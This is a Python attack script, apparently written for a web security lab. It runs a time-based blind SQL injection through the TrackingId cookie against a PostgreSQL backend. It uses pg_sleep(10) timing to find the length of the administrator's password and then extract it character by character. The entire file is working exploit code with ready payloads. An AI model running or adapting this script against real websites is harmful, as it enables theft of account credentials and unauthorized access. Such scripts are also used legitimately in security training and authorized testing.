#!/usr/bin/python3
from pwn import *
import requests, signal, time, sys, string
import argparse

parser = argparse.ArgumentParser(description="this script dumps a password using timers")
parser.add_argument("-u", "--url", help="url of the target server", dest="main_url", required=True)
parser.add_argument("-t", "--tracking-id", help="TrackingId cookie value", dest="tracking_id", required=True)
parser.add_argument("-s", "--session", help="session cookie value", dest="session", required=True)
parser.add_argument("-l", "--password_length", help="password length", dest="password_length")
parser.add_argument("-f", "--first_position", help="starting dump position", dest="first_position")


args = parser.parse_args()
main_url = str(args.main_url)
trackingID = str(args.tracking_id)
session = str(args.session)

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)

#Ctrl+c
signal.signal(signal.SIGINT, def_handler)

characters=string.ascii_lowercase + string.digits

def makeRequest():
    
    password = ""
    cookies = ""
    password_length = 0
    start_position = 1 if args.first_position == None else int(args.first_position)

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password length")

    if args.password_length == None:
        for n in range(1,100):
            cookies = {
                'TrackingId' : "%s'||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end from users where username='administrator' and length(password)=%d)||'" % (trackingID, n),
                'session' : "%s" % (session)
            }

            time_start = time.time()

            r=requests.get(main_url, cookies=cookies)

            time_end = time.time()

            p2.status(n)
            
            if time_end - time_start > 10:
                password_length = n
                break 
    else:
        password_length = int(args.password_length)
        p2.status(password_length)

    p2 = log.progress("Dumping password")

    for position in range(start_position,password_length+1):
        for character in characters:

            cookies = {
                'TrackingId' : "%s'||(select case when substr(password,%d,1)='%s' then pg_sleep(10) else pg_sleep(0) end from users where username='administrator')||'" % (trackingID, position, character),
                'session' : "%s" % (session)
            }
            
            p1.status(cookies['TrackingId'])

            time_start = time.time()
            
            r=requests.get(main_url, cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 10:
                password += character
                p2.status(password)
                break 


if __name__ == '__main__':
    makeRequest()
